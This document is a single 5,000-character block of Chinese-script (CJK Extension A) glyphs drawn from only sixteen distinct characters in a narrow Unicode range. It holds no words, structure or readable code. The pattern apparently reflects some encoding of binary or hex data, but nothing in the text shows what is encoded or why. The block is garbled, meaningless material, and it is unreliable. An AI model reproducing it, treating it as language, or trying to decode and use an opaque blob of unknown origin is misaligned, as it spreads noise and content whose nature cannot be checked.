㒙㒙㒘㒠㒡㒠㒝㒠㒙㒠㒙㒟㒡㒟㒟㒟㒙㒞㒥㒤㒚㒞㒝㒞㒙㒝㒥㒝㒢㒝㒝㒝㒙㒜㒥㒜㒢㒝㒝㒜㒙㒛㒥㒛㒡㒞㒗㒛㒣㒚㒥㒚㒡㒚㒝㒟㒙㒡㒗㒠㒠㒠㒥㒟㒢㒟㒢㒟㒚㒟㒡㒟㒢㒝㒛㒚㒛㒗㒦㒗㒙㒦㒥㒦㒡㒚㒠㒜㒥㒛㒦㒜㒤㒜㒠㒚㒗㒚㒦㒛㒞㒚㒢㒤㒙㒤㒟㒣㒡㒣㒝㒣㒙㒗㒜㒘㒦㒙㒡㒗㒜㒘㒚㒘㒣㒘㒣㒗㒢㒗㒘㒦㒦㒘㒛㒠㒠㒟㒥㒟㒡㒟㒝㒣㒜㒥㒤㒥㒟㒥㒛㒤㒞㒤㒘㒤㒥㒚㒟㒝㒟㒜㒥㒜㒡㒜㒝㒡㒙㒡㒦㒢㒣㒡㒢㒢㒗㒢㒙㒗㒥㒚㒝㒜㒥㒙㒦㒤㒜㒣㒗㒢㒢㒢㒞㒢㒚㒡㒦㒡㒢㒣㒞㒛㒠㒡㒥㒘㒘㒦㒥㒦㒡㒦㒝㒛㒙㒝㒗㒜㒠㒜㒥㒛㒢㒛㒢㒛㒚㒛㒡㒛㒢㒘㒥㒚㒣㒚㒜㒙㒦㒙㒥㒙㒥㒥㒗㒢㒞㒡㒥㒡㒡㒡㒝㒘㒙㒦㒦㒗㒚㒗㒟㒗㒜㒢㒟㒠㒘㒟㒝㒟㒙㒞㒥㒤㒗㒤㒦㒥㒜㒤㒞㒣㒣㒤㒙㒣㒞㒢㒙㒝㒝㒜㒝㒜㒙㒛㒥㒠㒙㒢㒜㒡㒥㒡㒙㒞㒥㒡㒢㒡㒛㒟㒦㒠㒥㒟㒦㒠㒘㒟㒣㒛㒛㒙㒛㒘㒙㒗㒥㒗㒡㒛㒤㒝㒞㒞㒙㒚㒥㒜㒢㒝㒜㒜㒘㒛㒦㒜㒛㒛㒝㒚㒦㒛㒟㒛㒡㒛㒜㒛㒣㒣㒥㒣㒝㒣㒙㒢㒥㒙㒘㒘㒞㒘㒦㒘㒚㒙㒟㒡㒦㒡㒙㒠㒥㒠㒡㒥㒤㒗㒘㒗㒗㒦㒜㒦㒠㒦㒙㒤㒦㒤㒤㒤㒢㒣㒝㒞㒤㒝㒡㒝㒝㒝㒙㒡㒙㒢㒦㒣㒠㒢㒜㒢㒚㒢㒟㒡㒡㒡㒚㒡㒣㒡㒥㒞㒞㒠㒝㒠㒙㒟㒦㒟㒡㒛㒙㒘㒥㒘㒡㒘㒝㒘㒙㒟㒣㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒗㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒤㒝㒤㒞㒣㒥㒦㒡㒣㒝㒣㒙㒢㒥㒢㒡㒣㒘㒢㒙㒢㒛㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒝㒡㒙㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒝㒢㒝㒙㒞㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒛㒝㒛㒞㒚㒥㒜㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒦㒘㒡㒛㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒤㒦㒥㒗㒘㒦㒝㒗㒛㒥㒥㒥㒡㒥㒝㒥㒙㒥㒟㒤㒡㒤㒝㒤㒙㒥㒗㒣㒡㒣㒝㒣㒚㒢㒥㒣㒟㒢㒝㒢㒙㒡㒥㒣㒡㒡㒝㒡㒙㒠㒦㒠㒡㒠㒞㒠㒙㒠㒘㒟㒡㒠㒟㒟㒙㒞㒥㒞㒤㒞㒝㒟㒘㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒜㒞㒜㒙㒜㒘㒛㒡㒛㒟㒛㒙㒜㒥㒚㒡㒚㒝㒚㒚㒙㒥㒙㒢㒙㒝㒙㒦㒘㒥㒘㒡㒘㒝㒘㒙㒗㒦㒗㒡㒗㒟㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒣㒤㒝㒤㒝㒣㒥㒣㒡㒣㒝㒣㒙㒤㒚㒢㒡㒢㒞㒢㒙㒣㒥㒢㒘㒡㒝㒡㒞㒠㒥㒠㒥㒠㒝㒠㒛㒟㒥㒢㒗㒗㒗㒟㒙㒟㒚㒞㒡㒟㒢㒞㒙㒝㒦㒝㒡㒝㒦㒝㒙㒝㒙㒝㒟㒜㒝㒜㒙㒛㒥㒜㒦㒛㒝㒛㒚㒚㒥㒝㒡㒢㒠㒚㒙㒚㒙㒙㒡㒚㒙㒙㒙㒙㒝㒘㒡㒘㒣㒙㒥㒗㒥㒗㒡㒗㒝㒘㒚㒦㒥㒦㒢㒦㒝㒦㒛㒥㒥㒥㒥㒦㒛㒥㒙㒤㒥㒤㒡㒥㒞㒤㒙㒣㒦㒣㒡㒤㒟㒚㒠㒢㒥㒢㒡㒢㒝㒣㒗㒡㒥㒡㒡㒡㒝㒣㒙㒢㒤㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒠㒟㒙㒠㒗㒞㒡㒞㒝㒞㒛㒝㒥㒞㒠㒝㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒛㒟㒛㒙㒛㒗㒚㒡㒜㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒙㒡㒘㒝㒚㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒡㒦㒙㒦㒗㒙㒦㒥㒝㒥㒛㒤㒥㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒙㒦㒣㒙㒢㒥㒢㒡㒢㒟㒢㒙㒡㒦㒡㒡㒡㒝㒦㒢㒠㒥㒠㒡㒠㒝㒠㒚㒟㒥㒟㒡㒟㒝㒟㒙㒟㒛㒞㒡㒞㒝㒞㒙㒛㒗㒝㒤㒝㒝㒝㒙㒜㒥㒣㒟㒢㒢㒣㒠㒞㒟㒜㒜㒛㒝㒛㒙㒚㒥㒟㒝㒡㒜㒠㒜㒟㒦㒠㒝㒞㒠㒟㒜㒠㒗㒟㒚㒟㒝㒟㒝㒢㒝㒘㒢㒗㒝㒗㒙㒦㒥㒛㒞㒝㒜㒝㒞㒝㒘㒛㒦㒙㒟㒜㒞㒜㒙㒛㒥㒛㒜㒛㒗㒦㒦㒗㒤㒚㒙㒙㒢㒙㒘㒙㒜㒚㒛㒢㒡㒡㒥㒡㒡㒡㒝㒥㒢㒗㒣㒗㒤㒗㒡㒦㒚㒦㒣㒥㒤㒥㒢㒡㒣㒟㒛㒞㒡㒞㒝㒞㒙㒢㒥㒣㒢㒤㒟㒣㒞㒣㒣㒣㒥㒦㒥㒜㒠㒛㒥㒛㒡㒛㒝㒟㒜㒡㒤㒡㒟㒡㒛㒠㒞㒠㒘㒠㒥㒚㒙㒙㒙㒘㒥㒘㒡㒙㒟㒡㒞㒗㒥㒗㒡㒗㒝㒗㒝㒦㒥㒦㒡㒦㒝㒘㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒤㒞㒤㒙㒥㒗㒣㒡㒣㒝㒣㒚㒢㒥㒢㒣㒢㒝㒢㒙㒡㒥㒡㒡㒡㒝㒡㒙㒡㒗㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒛㒝㒥㒝㒣㒝㒝㒟㒙㒜㒥㒜㒡㒜㒞㒜㒙㒛㒥㒛㒡㒛㒢㒛㒙㒜㒥㒚㒡㒚㒝㒚㒚㒙㒥㒙㒢㒙㒝㒙㒜㒘㒥㒚㒡㒘㒝㒘㒙㒗㒦㒗㒡㒗㒞㒗㒙㒗㒛㒦㒡㒦㒣㒦㒝㒥㒥㒥㒤㒥㒝㒥㒙㒤㒥㒤㒢㒤㒝㒤㒚㒣㒥㒣㒡㒦㒥㒣㒙㒢㒥㒢㒡㒢㒝㒢㒙㒡㒥㒡㒡㒡㒝㒗㒢㒠㒥㒠㒢㒠㒝㒠㒜㒟㒥㒟㒢㒟㒝㒟㒙㒤㒞㒞㒡㒞㒝㒞㒙㒝㒦㒝㒡㒝㒝㒝㒙㒜㒥㒜㒢㒜㒝㒜㒙㒛㒥㒛㒢㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒥㒙㒝㒙㒙㒘㒥㒣㒙㒘㒦㒘㒙㒗㒥㒗㒡㒛㒠㒝㒥㒜㒦㒝㒤㒝㒠㒛㒗㒛㒦㒜㒞㒛㒢㒗㒣㒥㒡㒤㒡㒤㒝㒤㒙㒘㒝㒚㒠㒚㒙㒙㒝㒗㒙㒙㒦㒙㒟㒘㒚㒙㒙㒘㒚㒘㒜㒘㒗㒡㒘㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒝㒠㒙㒢㒥㒛㒣㒟㒜㒞㒙㒝㒥㒝㒡㒢㒝㒤㒛㒣㒤㒤㒙㒢㒦㒢㒦㒢㒞㒢㒥㒢㒦㒠㒙㒢㒗㒡㒠㒡㒚㒡㒙㒡㒙㒚㒗㒙㒝㒙㒙㒘㒥㒚㒡㒘㒤㒘㒙㒗㒦㒗㒡㒗㒝㒗㒙㒦㒦㒦㒡㒘㒣㒗㒟㒥㒥㒥㒢㒥㒝㒥㒝㒤㒥㒤㒢㒤㒝㒤㒝㒣㒥㒣㒥㒤㒛㒣㒙㒢㒥㒢㒡㒢㒡㒢㒙㒡㒦㒡㒡㒡㒡㒢㒗㒠㒥㒠㒡㒠㒝㒠㒞㒟㒥㒟㒢㒟㒝㒢㒙㒗㒘㒞㒡㒞㒝㒞㒙㒞㒗㒝㒡㒝㒠㒝㒙㒜㒥㒢㒚㒜㒝㒜㒙㒛㒥㒛㒢㒛㒝㒛㒙㒚㒥㒚㒢㒛㒝㒚㒙㒙㒥㒙㒡㒦㒟㒚㒗㒘㒥㒘㒡㒘㒝㒜㒠㒞㒚㒞㒥㒛㒡㒝㒞㒞㒘㒜㒤㒜㒢㒝㒗㒜㒙㒛㒢㒜㒛㒜㒝㒜㒘㒜㒟㒤㒣㒤㒙㒣㒥㒣㒡㒘㒝㒙㒚㒚㒗㒘㒦㒙㒛㒙㒝㒤㒢㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒠㒝㒡㒙㒣㒥㒟㒡㒟㒡㒟㒙㒞㒥㒞㒡㒤㒤㒤㒚㒤㒢㒣㒦㒢㒡㒝㒢㒜㒥㒜㒡㒜㒝㒡㒠㒢㒤㒢㒣㒢㒘㒢㒜㒡㒥㒠㒢㒠㒠㒠㒞㒤㒝㒚㒘㒙㒝㒙㒙㒘㒥㒜㒤㒟㒜㒟㒗㒞㒣㒝㒦㒝㒠㒞㒝㒜㒙㒗㒝㒦㒝㒦㒙㒥㒥㒚㒙㒜㒜㒛㒥㒛㒙㒘㒥㒛㒢㒛㒛㒙㒦㒚㒥㒙㒦㒚㒘㒙㒣㒘㒗㒢㒝㒤㒣㒢㒤㒡㒡㒡㒝㒡㒙㒥㒥㒗㒣㒗㒜㒗㒡㒦㒞㒦㒞㒥㒦㒦㒝㒦㒞㒣㒡㒥㒟㒥㒘㒤㒢㒤㒡㒤㒡㒝㒙㒝㒤㒜㒡㒜㒝㒜㒙㒠㒙㒡㒦㒢㒠㒡㒜㒡㒚㒡㒟㒠㒡㒠㒚㒠㒣㒠㒥㒝㒞㒟㒝㒟㒙㒞㒦㒞㒡㒥㒛㒘㒚㒗㒡㒗㒝㒗㒙㒝㒥㒜㒢㒜㒦㒝㒛㒝㒘㒛㒗㒥㒞㒥㒙㒥㒟㒤㒡㒤㒝㒤㒙㒘㒜㒙㒦㒚㒡㒘㒜㒙㒚㒙㒣㒙㒣㒘㒢㒘㒘㒗㒦㒡㒝㒡㒢㒠㒥㒠㒡㒠㒝㒤㒜㒦㒡㒥㒢㒦㒠㒦㒜㒣㒣㒤㒢㒥㒚㒤㒞㒝㒥㒞㒚㒝㒝㒝㒙㒜㒥㒡㒡㒣㒟㒣㒘㒣㒝㒢㒚㒢㒚㒡㒢㒢㒙㒢㒚㒗㒟㒚㒠㒙㒥㒙㒡㒙㒝㒞㒟㒟㒞㒟㒤㒞㒦㒞㒛㒞㒡㒝㒦㒙㒝㒗㒙㒦㒥㒦㒡㒦㒝㒞㒗㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒤㒝㒦㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒟㒢㒙㒤㒥㒡㒡㒡㒝㒡㒙㒠㒥㒡㒡㒠㒝㒠㒡㒟㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒟㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒣㒛㒝㒝㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒟㒙㒙㒚㒥㒘㒡㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒘㒘㒦㒥㒙㒡㒦㒝㒦㒙㒥㒥㒥㒡㒦㒝㒥㒙㒥㒡㒤㒡㒥㒟㒤㒙㒣㒥㒣㒡㒣㒝㒣㒤㒢㒥㒢㒡㒢㒝㒣㒛㒡㒥㒡㒡㒡㒞㒡㒙㒡㒙㒠㒡㒠㒝㒠㒙㒡㒥㒟㒡㒟㒝㒟㒚㒞㒥㒞㒢㒞㒝㒞㒦㒝㒥㒞㒣㒝㒝㒝㒙㒝㒘㒜㒡㒜㒢㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒢㒚㒝㒚㒜㒙㒥㒙㒣㒙㒝㒛㒙㒘㒥㒘㒡㒘㒞㒘㒙㒗㒦㒗㒡㒗㒞㒗㒙㒦㒥㒦㒡㒦㒝㒦㒚㒥㒥㒥㒣㒥㒝㒥㒙㒤㒥㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒣㒗㒢㒡㒢㒡㒢㒙㒡㒥㒡㒡㒡㒝㒢㒞㒠㒥㒠㒢㒠㒝㒢㒙㒠㒜㒟㒡㒟㒢㒟㒙㒟㒙㒞㒡㒟㒛㒞㒙㒠㒛㒥㒛㒝㒝㒝㒞㒜㒥㒝㒦㒜㒝㒜㒚㒛㒥㒜㒚㒛㒝㒛㒝㒛㒣㒚㒡㒚㒝㒚㒙㒛㒚㒙㒡㒙㒞㒙㒙㒛㒥㒠㒤㒘㒝㒘㒝㒗㒥㒘㒘㒗㒝㒗㒜㒦㒥㒗㒗㒘㒙㒦㒙㒥㒥㒥㒡㒦㒞㒥㒙㒤㒦㒤㒡㒤㒟㒤㒙㒤㒙㒤㒟㒣㒝㒣㒙㒢㒥㒣㒢㒢㒝㒢㒚㒡㒥㒢㒣㒘㒤㒡㒙㒠㒥㒠㒡㒠㒡㒠㒙㒟㒥㒟㒡㒡㒝㒡㒘㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒞㒞㒝㒝㒞㒛㒜㒥㒜㒡㒜㒟㒜㒙㒜㒚㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒣㒙㒝㒙㒛㒘㒥㒚㒡㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒗㒟㒦㒡㒘㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒥㒗㒤㒝㒤㒛㒘㒚㒣㒡㒣㒟㒣㒙㒢㒥㒢㒡㒢㒝㒢㒙㒡㒥㒘㒚㒡㒝㒡㒙㒠㒥㒠㒣㒠㒝㒠㒚㒟㒥㒟㒡㒤㒦㒟㒙㒞㒥㒞㒡㒞㒞㒞㒙㒝㒥㒝㒡㒝㒝㒝㒟㒜㒥㒜㒡㒜㒝㒦㒡㒜㒦㒛㒡㒛㒝㒛㒙㒟㒢㒡㒠㒡㒢㒡㒜㒠㒚㒝㒣㒠㒢㒠㒝㒠㒙㒟㒠㒟㒛㒛㒚㒜㒘㒞㒝㒝㒦㒝㒜㒝㒠㒦㒡㒗㒘㒦㒙㒥㒥㒥㒡㒚㒙㒜㒘㒛㒘㒚㒢㒛㒙㒙㒜㒚㒘㒚㒣㒙㒦㒚㒙㒚㒙㒥㒛㒢㒥㒢㒙㒡㒥㒡㒡㒥㒦㒘㒗㒘㒘㒗㒥㒦㒞㒗㒗㒦㒘㒥㒦㒜㒟㒟㒟㒞㒥㒞㒡㒞㒝㒣㒙㒣㒦㒤㒣㒣㒢㒤㒗㒤㒙㒤㒟㒜㒤㒜㒙㒛㒥㒛㒡㒟㒠㒢㒘㒡㒣㒡㒟㒠㒢㒠㒜㒡㒙㒞㒥㒙㒠㒙㒙㒘㒥㒘㒡㒟㒛㒞㒞㒟㒜㒘㒝㒗㒝㒗㒙㒦㒥㒗㒣㒟㒢㒦㒙㒥㒥㒥㒡㒥㒠㒥㒙㒤㒥㒤㒡㒦㒝㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒣㒗㒢㒝㒣㒛㒡㒥㒡㒡㒡㒞㒡㒙㒡㒗㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒝㒟㒛㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒜㒟㒜㒙㒜㒗㒛㒡㒝㒝㒛㒙㒚㒥㒚㒢㒚㒝㒚㒙㒙㒥㒙㒥㒙㒝㒛㒙㒘㒥㒘㒡㒘㒞㒘㒙㒗㒦㒗㒡㒗㒞㒗㒙㒘㒥㒦㒡㒦㒝㒦㒚㒥㒥㒥㒢㒥㒝㒥㒞㒤㒥㒥㒗㒤㒡㒤㒙㒤㒘㒣㒡㒣㒝㒣㒙㒢㒦㒢㒡㒢㒞㒢㒙㒡㒥㒥㒙㒡㒝㒡㒙㒠㒥㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒥㒦㒟㒙㒞㒦㒞㒡㒞㒠㒞㒙㒝㒦㒝㒡㒝㒝㒢㒢㒜㒥㒜㒡㒜㒝㒜㒚㒛㒥㒛㒡㒛㒝㒛㒙㒚㒦㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒙㒡㒘㒡㒘㒝㒘㒙㒗㒥㒘㒛㒗㒝㒗㒙㒦㒥㒛㒘㒜㒢㒝㒝㒛㒘㒛㒦㒜㒟㒜㒟㒛㒞㒚㒤㒚㒢㒙㒝㒤㒦㒣㒡㒣㒝㒣㒙㒗㒘㒗㒚㒤㒝㒙㒥㒣㒥㒥㒤㒗㒦㒗㒝㒦㒦㒦㒥㒜㒠㒚㒜㒦㒤㒡㒡㒣㒟㒤㒗㒣㒡㒣㒥㒟㒙㒞㒙㒝㒥㒝㒡㒢㒣㒣㒢㒤㒗㒢㒢㒣㒟㒠㒥㒢㒞㒣㒙㒡㒢㒡㒢㒢㒗㒡㒠㒝㒗㒚㒠㒙㒥㒙㒡㒙㒝㒞㒟㒟㒞㒟㒤㒞㒦㒞㒛㒞㒡㒝㒦㒜㒡㒗㒣㒦㒥㒦㒡㒦㒝㒚㒟㒜㒞㒜㒣㒛㒢㒚㒜㒛㒚㒛㒣㒛㒣㒚㒞㒛㒗㒞㒙㒤㒞㒣㒙㒢㒥㒢㒡㒗㒟㒘㒞㒘㒥㒘㒝㒗㒦㒗㒜㒦㒦㒗㒥㒦㒢㒦㒝㒥㒘㒦㒥㒦㒜㒦㒛㒤㒦㒥㒘㒤㒢㒣㒟㒝㒦㒥㒟㒝㒣㒝㒙㒜㒥㒜㒡㒡㒝㒢㒚㒣㒗㒡㒦㒢㒛㒢㒝㒢㒣㒛㒞㒚㒝㒚㒙㒙㒥㒝㒣㒟㒞㒟㒠㒠㒚㒟㒝㒞㒥㒟㒘㒝㒗㒝㒦㒞㒚㒞㒘㒞㒙㒜㒦㒣㒡㒦㒙㒝㒣㒦㒙㒥㒝㒥㒙㒤㒥㒙㒥㒛㒟㒚㒚㒚㒗㒙㒢㒚㒙㒙㒡㒙㒤㒢㒡㒢㒡㒢㒙㒡㒥㒡㒡㒗㒤㒗㒚㒗㒢㒦㒦㒡㒟㒠㒙㒟㒥㒟㒡㒟㒝㒢㒦㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒝㒝㒟㒙㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒛㒥㒛㒙㒝㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒥㒙㒝㒙㒣㒘㒥㒘㒡㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒘㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒥㒙㒤㒝㒦㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒥㒢㒙㒣㒥㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒠㒝㒠㒜㒟㒥㒢㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒡㒞㒙㒞㒜㒝㒡㒞㒟㒝㒙㒜㒥㒜㒡㒜㒝㒜㒥㒛㒥㒛㒡㒛㒝㒝㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒞㒙㒙㒚㒗㒘㒡㒘㒝㒘㒛㒗㒥㒘㒗㒗㒝㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒥㒟㒥㒙㒥㒗㒤㒡㒦㒝㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒣㒚㒢㒝㒤㒙㒡㒥㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒡㒘㒠㒙㒡㒥㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒝㒞㒞㒝㒥㒞㒣㒝㒝㒝㒙㒝㒗㒜㒡㒜㒟㒜㒙㒛㒥㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒛㒙㒥㒙㒢㒙㒝㒙㒙㒘㒥㒘㒡㒘㒝㒘㒙㒗㒦㒗㒡㒗㒝㒗㒙㒦㒥㒗㒗㒦㒝㒦㒙㒥㒥㒥㒡㒥㒣㒥㒙㒤㒥㒤㒡㒙㒝㒚㒚㒛㒗㒙㒦㒚㒛㒚㒝㒚㒣㒣㒙㒢㒝㒢㒙㒡㒥㒦㒚㒘㒛㒘㒜㒘㒙㒦㒢㒗㒛㒦㒜㒦㒚㒗㒟㒟㒠㒟㒙㒞㒥㒞㒡㒥㒛㒤㒞㒥㒜㒘㒙㒞㒘㒝㒙㒜㒥㒜㒡㒡㒙㒣㒘㒢㒘㒡㒢㒢㒙㒠㒜㒡㒘㒡㒣㒠㒦㒡㒙㒡㒙㒤㒙㒙㒤㒙㒙㒘㒥㒘㒡㒜㒠㒟㒘㒞㒣㒞㒟㒝㒢㒝㒜㒞㒙㒛㒥㒗㒞㒦㒙㒥㒥㒥㒡㒚㒚㒜㒘㒜㒚㒛㒤㒚㒢㒘㒛㒛㒚㒚㒥㒚㒡㒚㒘㒙㒣㒥㒢㒦㒠㒘㒥㒘㒞㒗㒤㒘㒘㒡㒥㒠㒥㒠㒡㒠㒝㒡㒛㒙㒚㒟㒡㒟㒝㒟㒙㒟㒗㒞㒡㒞㒝㒞㒙㒟㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒜㒝㒜㒜㒛㒥㒜㒣㒛㒝㒛㒙㒚㒦㒚㒡㒚㒡㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒘㒣㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒦㒗㒥㒡㒥㒟㒥㒙㒦㒥㒤㒡㒤㒝㒤㒚㒣㒥㒣㒡㒣㒝㒣㒚㒢㒥㒤㒡㒢㒝㒢㒙㒡㒦㒡㒡㒡㒞㒡㒙㒡㒛㒠㒡㒢㒝㒠㒙㒟㒥㒟㒢㒟㒝㒟㒚㒞㒥㒞㒦㒞㒝㒞㒟㒞㒙㒝㒡㒝㒠㒝㒙㒜㒥㒜㒡㒜㒞㒜㒙㒛㒦㒛㒡㒛㒝㒞㒡㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒟㒞㒘㒡㒘㒞㒘㒙㒘㒘㒗㒡㒗㒞㒗㒙㒦㒥㒜㒚㒦㒝㒦㒙㒥㒥㒥㒢㒥㒝㒥㒙㒤㒥㒤㒡㒤㒞㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒣㒢㒙㒡㒥㒡㒡㒡㒝㒡㒟㒠㒥㒠㒡㒠㒝㒥㒜㒦㒤㒦㒦㒦㒟㒥㒜㒥㒚㒛㒣㒟㒗㒞㒙㒝㒥㒝㒡㒤㒙㒤㒘㒢㒦㒢㒥㒣㒠㒣㒝㒣㒗㒢㒚㒢㒛㒡㒠㒝㒟㒚㒥㒚㒝㒚㒙㒙㒥㒠㒘㒟㒞㒟㒦㒟㒚㒝㒥㒙㒗㒘㒙㒗㒥㒗㒡㒛㒤㒝㒞㒞㒙㒛㒠㒜㒟㒜㒣㒜㒚㒛㒤㒜㒡㒜㒜㒚㒙㒦㒗㒤㒝㒤㒙㒣㒥㒚㒣㒙㒟㒚㒡㒘㒦㒙㒤㒙㒠㒘㒞㒙㒙㒘㒚㒗㒡㒤㒣㒣㒤㒣㒠㒣㒡㒣㒚㒣㒝㒣㒚㒢㒢㒢㒠㒢㒘㒡㒥㒡㒞㒣㒠㒝㒥㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒛㒝㒠㒘㒜㒟㒛㒡㒛㒝㒛㒙㒜㒗㒞㒤㒚㒝㒚㒙㒙㒥㒙㒣㒙㒝㒙㒙㒘㒥㒙㒣㒘㒝㒘㒙㒗㒦㒗㒡㒗㒠㒗㒙㒦㒥㒦㒡㒘㒝㒦㒙㒥㒥㒥㒢㒥㒝㒥㒚㒤㒥㒤㒥㒤㒝㒥㒛㒣㒥㒣㒡㒣㒠㒣㒙㒣㒚㒢㒡㒢㒝㒢㒙㒡㒥㒡㒡㒡㒝㒡㒚㒠㒥㒠㒤㒠㒝㒠㒛㒟㒥㒡㒡㒟㒝㒟㒙㒞㒦㒞㒡㒞㒞㒞㒙㒞㒛㒝㒡㒟㒝㒝㒙㒜㒥㒜㒢㒜㒝㒜㒚㒛㒥㒛㒢㒛㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒚㒗㒙㒡㒙㒟㒙㒙㒘㒥㒘㒡㒘㒝㒘㒙㒗㒥㒗㒢㒗㒝㒗㒚㒦㒥㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒥㒞㒥㒙㒤㒥㒤㒡㒤㒝㒤㒟㒣㒥㒣㒡㒣㒝㒣㒙㒣㒛㒢㒡㒢㒝㒢㒙㒦㒥㒗㒢㒘㒟㒗㒞㒗㒣㒗㒥㒘㒛㒠㒡㒟㒥㒟㒡㒟㒝㒣㒢㒥㒣㒥㒤㒥㒡㒤㒚㒤㒣㒣㒤㒣㒢㒥㒗㒝㒜㒜㒡㒜㒝㒜㒙㒠㒘㒢㒠㒢㒛㒢㒗㒡㒚㒠㒤㒡㒡㒜㒣㒚㒘㒙㒡㒙㒝㒙㒙㒟㒣㒞㒦㒟㒤㒘㒙㒘㒠㒗㒡㒗㒝㒗㒙㒛㒡㒝㒠㒜㒠㒜㒚㒜㒡㒚㒤㒛㒠㒜㒛㒛㒞㒛㒡㒛㒡㒜㒗㒤㒦㒣㒡㒣㒝㒣㒙㒗㒢㒙㒠㒙㒢㒙㒜㒘㒚㒥㒣㒘㒢㒘㒝㒘㒙㒗㒠㒗㒛㒣㒚㒤㒘㒦㒝㒥㒦㒥㒜㒥㒠㒟㒜㒞㒝㒞㒙㒝㒥㒞㒣㒦㒢㒝㒙㒜㒥㒜㒡㒜㒟㒜㒙㒛㒥㒛㒡㒝㒝㒛㒙㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒥㒙㒝㒚㒛㒘㒥㒘㒡㒘㒞㒘㒙㒘㒚㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒝㒦㒛㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒣㒟㒣㒙㒣㒗㒢㒡㒤㒝㒢㒙㒡㒥㒡㒢㒡㒝㒡㒙㒠㒥㒠㒢㒠㒝㒢㒙㒟㒥㒟㒡㒟㒞㒟㒙㒞㒦㒞㒡㒞㒣㒞㒙㒟㒥㒝㒡㒝㒝㒝㒚㒜㒥㒜㒢㒜㒝㒜㒜㒛㒥㒛㒣㒟㒢㒛㒙㒛㒘㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒝㒟㒢㒘㒥㒘㒢㒘㒝㒘㒜㒗㒥㒗㒢㒗㒝㒗㒙㒜㒞㒦㒡㒦㒝㒦㒙㒥㒦㒥㒡㒥㒝㒥㒙㒤㒥㒤㒢㒤㒝㒤㒙㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒥㒢㒝㒢㒙㒡㒥㒞㒣㒡㒡㒡㒙㒠㒥㒠㒡㒦㒤㒦